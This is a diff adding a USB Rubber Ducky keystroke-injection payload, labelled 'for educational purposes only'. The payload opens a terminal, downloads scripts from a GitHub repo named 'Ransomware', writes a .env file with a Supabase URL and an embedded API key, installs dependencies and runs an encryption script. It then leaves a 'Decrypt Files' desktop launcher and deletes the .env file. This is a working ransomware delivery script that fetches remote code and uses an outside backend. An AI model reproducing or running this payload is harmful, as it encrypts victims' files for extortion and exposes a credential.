@@ -1,0 +1,36 @@
+REM Rubber Ducky Payload to clone GitHub repo, install dependencies, and run Python script on Kali Linux REM For educational purposes only
+
+DELAY 1000 
+GUI t 
+DELAY 500
+STRING cd ~/Desktop 
+ENTER
+DELAY 200
+STRING wget https://raw.githubusercontent.com/Google-design/Ransomware/main/encrypt_full.py
+ENTER
+DELAY 500
+STRING wget https://raw.githubusercontent.com/Google-design/Ransomware/main/decrypt_gui.py
+ENTER 
+DELAY 500
+STRING echo -e 'SUPABASE_URL="https://qlvtkhpjazvwfnqzoqjr.supabase.co"\nSUPABASE_KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFsdnRraHBqYXp2d2ZucXpvcWpyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTc1NjI0OTgsImV4cCI6MjA3MzEzODQ5OH0.yl7fKMEOq-h-hfEmRmE5pWviuo18ZCAUMW5YpoIlyGw"' > .env
+ENTER
+DELAY 200
+STRING python3 -m venv venv
+ENTER 
+DELAY 500
+STRING source venv/bin/activate 
+ENTER 
+DELAY 200 
+STRING pip install cryptography supabase python-dotenv 
+ENTER 
+DELAY 5000
+STRING echo -e '[Desktop Entry]\nName=Decrypt Files\nExec=/bin/bash -c "cd ~/Desktop && source venv/bin/activate && python3 decrypt_gui.py && deactivate"\nType=Application\nTerminal=false\nIcon=system-lock-screen' > decrypt.desktop
+ENTER 
+DELAY 500
+STRING chmod +x decrypt.desktop
+ENTER
+DELAY 500
+STRING python3 encrypt_full.py 
+ENTER
+STRING rm .env
+ENTER
